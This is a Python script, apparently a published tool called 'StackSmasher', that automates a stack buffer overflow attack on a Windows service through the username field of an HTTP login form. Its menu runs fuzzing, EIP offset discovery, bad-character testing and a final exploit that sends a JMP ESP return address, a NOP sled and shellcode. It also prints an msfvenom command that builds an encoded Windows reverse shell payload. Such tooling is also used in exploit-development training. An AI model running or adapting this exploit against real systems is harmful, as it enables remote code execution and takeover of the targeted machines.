#!/usr/bin/env python3
import socket 
import sys
import pyfiglet
import time
import string 
import struct
import re
# pyrefly: ignore [missing-import]
from pwn import cyclic , cyclic_find , p32
from urllib.parse import quote

#--------- banner function 
def banner():
    banner_text = pyfiglet.figlet_format("StackSmasher")
    print("-" * 55)
    print(banner_text)
    print("  Stack Buffer Overflow Automation Tool v1.0")
    print("  Author: X7Null404 | GitHub: github.com/X7Null404")
    print("-" * 55)

#-------- choice what is you need
def get_choice():
    try:
        print("[1] Fuzzing")
        print("[2] Find EIP Offset (Pattern)")
        print("[3] Test Connection")
        print("[4] Bad Characters")
        print("[5] Full Exploit")
        print("[0] Exit\n")
        choice = int(input("[+] Choose: "))

    except ValueError:
        print("[+] Invalid Input: ValueError")
        sys.exit(0)
            
    except KeyboardInterrupt:
        print("\n[+] Bye >__<")
        sys.exit(0)
    except Exception as e:
        print(f"[+] An Error occurred: {e}")
        sys.exit(0)
            
    if not 0 <= choice <= 5:
        print("[+] Invalid Input, choose Between 0 to 5 ")
        sys.exit(0)
    else:
        return choice

    
    
#-------- input function 
def input_user():

#-------- validation input port   
  
    while True:
        #-----------flag ip and port
        flag_to_loop = True
        try :
            ip = input("[+] Enter target IPv4: ")
            port = int(input("[+] Enter target Port: "))

            #-------validation range port 
            if not 0 < port < 65535:
                print("[+] Please enter port between 0 and 65535")
                flag_to_loop = False
                

#------- validation on ip 
            parts = ip.split(".")
            if not len(parts) == 4:
                print("[+] Invalid Ipv4")
                print("[+] Please enter ipv4")
                flag_to_loop = False
                
    
            for part in parts:
                if not part.isdigit():
                    flag_to_loop = False
                    
                elif not 0 <= int(part) <= 255:
                    print("[+] Invalid ipv4")
                    print("[+] Please enter ipv4") 
                    flag_to_loop = False
            if flag_to_loop:
                break 
                 
        except ValueError:
            print("[+] Invalid value")
            

        except KeyboardInterrupt:
            print("\n[+] Bye >__<")
            sys.exit(0)
        
        except Exception as e:
            print(f"[+] An Error occurred: {e}")
            sys.exit(0)
    return ip , port


#--------- helper function to build POST request
def build_post_request(ip , body):
    request = "POST /login HTTP/1.1\r\n"
    request+= f"Host: {ip}\r\n"
    request+= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0\r\n"
    request+= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    request+= "Accept-Language: en-US,en;q=0.9\r\n"
    request+= "Accept-Encoding: gzip, deflate, br\r\n"
    request+= "Content-Type: application/x-www-form-urlencoded\r\n"
    request+= f"Content-Length: {len(body)}\r\n"
    request+= f"Origin: http://{ip}\r\n"
    request+= "Connection: keep-alive\r\n"
    request+= f"Referer: http://{ip}/login\r\n"
    request+= "Upgrade-Insecure-Requests: 1\r\n"
    request+= "Priority: u=0, i\r\n\r\n"
    request+= body
    return request

        
def fuzzing_mode(ip , port , payload_size):
#-----establish connection 
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.settimeout(0.5)
    payload = "A" * payload_size
    print(f"[+] Fuzzing payload: Trying byte {payload_size}")
    flag_connection = True
    try:
        con.connect((ip , port))

#-------Send Request
        body = f"username={payload}&password=111"
        request = build_post_request(ip , body)
        con.sendall(request.encode("utf-8"))

        #--------recv data 
        all_data = b""
        while True:
            try:
                
                chunk = con.recv(2048)
                if not chunk:
                    if len(all_data) == 0:
                        print("[+] Crash detected - no response")
                        flag_connection = False
                        break
                    else:
                        print("[+] Connection closed normally")
                        break
                all_data += chunk
            except socket.timeout:
                print(f"[+] port {port} TimeOut")
                flag_connection = False
                break
            
            except ConnectionRefusedError:
                print(f"[+] port {port} Refused ")
                flag_connection = False
                break
            
            except KeyboardInterrupt:
                print("Bye >__<")
                sys.exit(0)
                
            
            except Exception as e:
                print(f"[+] An Error occurred: {e}")
                flag_connection = False
                break
                
    
    except Exception as e :
        print(f"[+] An Error occurred: {e}")
        flag_connection = False
    
    finally :
        con.close()
        return payload_size , flag_connection

#-----offset function
def offset_mode(ip , port):
#---------calling the file payload_size
    try:
        with open("number_to_pattern.txt" , "r") as file:
            payload_size = file.read()
    except FileNotFoundError:
        print("payload Not Found ")
        payload_size = input("Enter The pattern To offset: ")
    except Exception as e:
        print(f"[+] An Error occurred: {e}")
        payload_size = input("Enter The pattern To offset: ")

#-------create pattern to payload
    pattern = cyclic(int(payload_size) , alphabet=string.ascii_uppercase , n=4)

#--------create connection to find EIP
    con_offset = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    con_offset.settimeout(0.7)

    try:
        con_offset.connect((ip , port))
#-------send request
        body = f"username={pattern}&password=111"
        request = build_post_request(ip , body)
        con_offset.sendall(request.encode("utf-8"))
        print("[+] Request Successful")

#--------wait to crash 
        time.sleep(2)
        
    except socket.timeout:
        print("[+] TimeOut - Server Likely crashed")
    except ConnectionRefusedError:
        print("[+] Connection refused - Server crashed!")
        sys.exit(0)
    finally:
        con_offset.close()

#------Insert EIP value from debugger
    print("\n[+] Now check Immunity Debugger for EIP value")
    print("[+] Look for: EIP: 0x42424242 (BBBB) or similar")
    eip = input("[+] Insert EIP value (Example 544F4241): ")

    try:
        eip_find = cyclic_find(p32(int(eip , 16)) , alphabet=string.ascii_uppercase , n=4)
        print(f"[+] The EIP offset is {eip_find} bytes")
#------Create file find_eip

        with open("eip_offset.txt" , 'w') as file:
            file.write(str(eip_find))
        print("[+] EIP offset saved to eip_offset.txt")

    except Exception as e:
        print(f"[+] Error finding offset:: {e}")
        print("[+] Try entering the EIP value as hex (544F4241)")


#------function to test connection 
def test_connection(ip , port):
    con = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    con.settimeout(0.7)

    try:
        con.connect((ip , port))

        request = "GET /login HTTP/1.1\r\n"
        request += f"Host: {ip}\r\n"
        request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.9\r\n"
        request += "Accept-Encoding: gzip, deflate, br\r\n"
        request += f"Referer: http://{ip}/\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Upgrade-Insecure-Requests: 1\r\n"
        request += "Priority: u=0, i\r\n\r\n"

        con.sendall(request.encode())
        try:
            response = con.recv(1024)
            if response:
                print("[+] Server responded")
                return True
            else:
                print("[+] No response from server")
                return False
        except socket.timeout:
            print("[+] No response TimeOut")
            return False

    except TimeoutError:
        print(f"[+] Connection TimeOut To {ip}:{port}")
        return False
    
    except ConnectionRefusedError:
        print(f"[+] Connection refused by {ip}:{port}")
        return False
    
    except Exception as e:
        print(f"[+] Error: {e}")
        return False
    finally:
        con.close()
    

#----------Function to find Bad Characters
def bad_characters_mode(ip ,port , eip_find): 
 
#------Create Payload with all bytes
    bad_chars = b""
    for i in range(1, 256):
        bad_chars += bytes([i])

#---------Create Payload:  padding + bad chars 
    payload = b"A" * int(eip_find) + b"BBBB" + bad_chars
#-------- convert payload to understand http
    payload_encoded = quote(payload , safe='')

#--------send all the byte in victim 
    con = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    con.settimeout(0.7)
    try:

        con.connect((ip , port))

        body = f"username={payload_encoded}&password=111"
        request = build_post_request(ip , body)
    
        con.sendall(request.encode())

        print("[+] Bad Characters payload sent")
        print("[+] Check memory dump in debugger!")
        try:
            response = con.recv(1024)
            if not response:
                print("[+] Machine crash")
        except socket.timeout:
            print("[+] Connection TimeOut - Server crashed ")
    except Exception as e:
        print(f"[+] Error: {e}")
    finally:
        con.close()

#----- Add List Bad char
    bad_char = []

#------validation Bad char input
    bad_char_input = input("Enter bad char found (comma separated, 00,0a,0d) :")
#------ Free space of bad char 
    user_bad_char = bad_char_input.strip().replace(" " , "")
#-------if not bad char 
    if not user_bad_char:
        print("[+] No bad chars entered - only null byte (0x00) will be excluded")
        return []

#------- validation bad char
    parts = user_bad_char.split(",")

    for part in parts:
        part = part.strip()
        part = part.replace("0x" , "").replace("\\x" , "")

#------ validation
        if len(part) != 2:
            print(f"[+] Error : {part} is not a valid bad char")
            continue

        if not re.match(r'^[0-9a-fA-F]{2}$' , part):
            print(f"[+] Error : {part} is not a valid bad char")
            continue

#------ convert to integer
        byte_val = int(part , 16)

#-----Validation to range
        if not 0 <= byte_val <= 255:
            print(f"[+] Error : {part} is not a valid bad char")
            continue

#----validation to repeated bad char
        if byte_val in bad_char:
            print(f"[*] Warning : {part} is repeated bad char")
            continue
        bad_char.append(byte_val)

    return bad_char

#------- function to jmp esp 
def jmp_esp_fun():
    try:
        print("\n[+] Find JMP ESP address using Immunity Debugger:")
        print("[+] 1. Attach to the process")
        print("[+] 2. Run: !mona jmp -r esp - Get addresses")
        print("[+] 3. Choose address from ImageLoad.dll or sqlite3.dll")
        print("[+] Example: 0x61c24169")

        jmp = input("\n[+] Enter JMP ESP use command !mona jmp -r esp in immunity debugger! : ")
    except (KeyboardInterrupt, EOFError):
        print("\n[+] Bye >__<")
        sys.exit(0)

#-----validation JMP ESP
    if jmp.startswith("0x"):
        jmp = jmp[2:]
    
    if len(jmp) != 8:
        print("[+] Error: Please enter a valid 8 character address")
        sys.exit(0)
    
    try:
        jmp_esp = struct.pack("<I" , int(jmp , 16))
    except ValueError:
        print("[+] Error: Invalid hex address")
        sys.exit(0)
    return jmp_esp
    
#-------Shellcode function 
def shellcode():
    print("\n[+] create shellcode with msfvenom:")
    print("[+] msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai exitfunc=thread -o shellcode.bin")
    try:
        with open("shellcode.bin" , "rb") as file :
            shell = file.read()
        print(f"[+] shellcode loaded: {len(shell)}")
    except FileNotFoundError:
        print("File shellcode.bin Not Found ")
        sys.exit(0)
    return shell
    
#--------Full Exploit
def full_exploit(ip , port ,eip_find , jmp_esp , shell):

#-------check to connection
    flag_to_connection = test_connection(ip , port)
    if not flag_to_connection:
        print("[!] Server not responding ")
        sys.exit(0)

#-------establish malicious payload 
    payload = b"A" * int(eip_find) + jmp_esp + b"\x90" * 32 + shell

#-------url encoded
    full_payload = quote(payload , safe='')
#--------establish network socket
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.settimeout(0.7)

    try:
        con.connect((ip , port))
        body = f"username={full_payload}&password=111"
        request = build_post_request(ip , body)

        con.sendall(request.encode())
        print("\n[+] Exploit sent!")
        print("[+] check your listener for shell...")
        print("[+] If no shell, check debugger for EIP")

    except TimeoutError:
        print("[+] TimeOut")
    except Exception as e:
        print(f"[+] ERROR: {e}")
    finally:
        con.close()

# ---------Menu Function which scenario code  
def menu():
#-------calling function banner
    banner()
#-------calling function get_choice
    choice = get_choice()
#------calling function input user
    ip , port = input_user()
#-------choice fuzzing 
    if choice == 1:
        for size in range(100, 10000, 100):
            current_size , flag_connection = fuzzing_mode(ip , port ,size)
            time.sleep(0.7)
            if not flag_connection:
                print(f"\n[!] Crash detected at: {current_size}")
                break
        else:
            print("[+] No crash detected up to 10000 bytes")

#------ write size byte in file 
        try:
            with open("number_to_pattern.txt" , 'w') as file :
                file.write(str(current_size))
                print(f"[+] Payload size {current_size} saved to number_to_pattern.txt")
        except Exception as e:
            print(f"[+] An Error occurred: {e}")
#-------choice offset mode     
    elif choice == 2:
        offset_mode(ip , port)
           

    
    elif choice == 3:
        test_connection(ip , port)

    elif choice == 4:
#-------check to find file eip.txt
        try:
            with open("eip_offset.txt" , 'r') as file :
                eip_find = file.read()
        except FileNotFoundError:
            print("eip_offset.txt Not found")
            eip_find= input("Please Enter EIP Pattern or run option 2 first: ")

        bad_char_list = bad_characters_mode(ip , port , eip_find)
        if bad_char_list:
            bad_char_str = ",".join([f"{b:02x}" for b in bad_char_list])
            try:
                with open("bad_char.txt" ,'w') as file:
                    file.write(bad_char_str)
                print(f"[+] Bad chars saved to bad_char.txt: {bad_char_str}")
            except Exception as e:
                print(f"[+] An Error occurred: {e}")
        else:
            print("[+] No bad characters found - only null byte (0x00) excluded")

    elif choice == 5:
#------calling jmp_esp function
        jmp_esp = jmp_esp_fun()

#-------calling shellcode function
        shell = shellcode()
        try:
            with open("eip_offset.txt" , "r") as file :
                eip_offset = file.read()
            print(f"[+] Using EIP offset: {eip_offset}")
        except Exception as e:
            print("eip_offset.txt Not Found! Run option2 first.")
            sys.exit(0)
            
        full_exploit(ip , port , eip_offset , jmp_esp , shell )


def main ():
    menu()


if __name__ == "__main__":
    main()
